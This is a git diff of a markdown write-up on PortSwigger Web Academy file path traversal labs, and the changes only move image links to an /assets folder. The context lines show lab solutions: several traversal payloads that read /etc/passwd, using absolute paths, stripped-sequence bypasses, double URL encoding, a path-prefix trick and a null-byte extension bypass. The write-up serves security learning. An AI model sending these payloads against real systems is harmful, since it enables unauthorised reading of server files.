@@ -26,15 +26,15 @@ I'll be using primarily [Portswigger Web Academy](https://portswigger.net/web-se
 
 If we check the source, we see that images will be loaded through parameter. 
 
-![picture 120](images/c597993ff6131a61361fa51d4c5bc275921f2a63919e9c24b9418c206759eec9.png)  
+![picture 120](/assets/images/c597993ff6131a61361fa51d4c5bc275921f2a63919e9c24b9418c206759eec9.png)  
 
 If not sanitized corectly, we'll have a directory traversal so let's have a try.
 
-![picture 121](images/fd668e2eee1f824ea9b6a443dd6e06fb185286db374724535a2a48e2b2337cbe.png)  
+![picture 121](/assets/images/fd668e2eee1f824ea9b6a443dd6e06fb185286db374724535a2a48e2b2337cbe.png)  
 
 Lab has been solved:
 
-![picture 122](images/846935903fdd2bfb47792706829326402fe31cccaca05d92c573af36fee43c9e.png)  
+![picture 122](/assets/images/846935903fdd2bfb47792706829326402fe31cccaca05d92c573af36fee43c9e.png)  
 
 # File path traversal, traversal sequences blocked with absolute path bypass
 
@@ -46,7 +46,7 @@ Lab has been solved:
 
 Solution - Absolute Path: `/image?filename=/etc/passwd`
 
-![picture 123](images/284ad5654d2b11062c08b8a45057e13117b96999e46b227114fac5d22138cb2b.png)  
+![picture 123](/assets/images/284ad5654d2b11062c08b8a45057e13117b96999e46b227114fac5d22138cb2b.png)  
 
 # File path traversal, traversal sequences stripped non-recursively
 >  This lab contains a file path traversal vulnerability in the display of product images.
@@ -57,7 +57,7 @@ Solution - Absolute Path: `/image?filename=/etc/passwd`
 
 Solution: `/image?filename=....//....//...//....//etc/passwd`
 
-![picture 124](images/e2b426de55767b8c9ae361bbb734510ada8a9b733bbaac1a4e18a59398779476.png)  
+![picture 124](/assets/images/e2b426de55767b8c9ae361bbb734510ada8a9b733bbaac1a4e18a59398779476.png)  
 
 # File path traversal, traversal sequences stripped with superfluous URL-decode
 >  This lab contains a file path traversal vulnerability in the display of product images.
@@ -68,7 +68,7 @@ Solution: `/image?filename=....//....//...//....//etc/passwd`
 
 Solution: `/image?filename=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd`
 
-![picture 125](images/7a8ee885d46ada4e07c55672470647193f56112a0f0c72b3cedd25c32dad8bc1.png)  
+![picture 125](/assets/images/7a8ee885d46ada4e07c55672470647193f56112a0f0c72b3cedd25c32dad8bc1.png)  
 
 # File path traversal, validation of start of path
 >  This lab contains a file path traversal vulnerability in the display of product images.
@@ -79,7 +79,7 @@ Solution: `/image?filename=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/pass
 
 Solution: `/image?filename=/var/www/images/../../../etc/passwd`
 
-![picture 126](images/67aacacdae05d85c63bbca9bc9a37f9b303b44e45b66ba7812b5617a83b2204a.png)  
+![picture 126](/assets/images/67aacacdae05d85c63bbca9bc9a37f9b303b44e45b66ba7812b5617a83b2204a.png)  
 
 PS: I'm not sure how common this vulnerability is!
 
@@ -92,4 +92,4 @@ PS: I'm not sure how common this vulnerability is!
 
 Solution: `/image?filename=../../../etc/passwd%00.png`
 
-![picture 127](images/4cbb65998eec18a495dc02c6f1fbc0976e89d7e2acdc140fe6539d2d47119925.png)  
+![picture 127](/assets/images/4cbb65998eec18a495dc02c6f1fbc0976e89d7e2acdc140fe6539d2d47119925.png)  
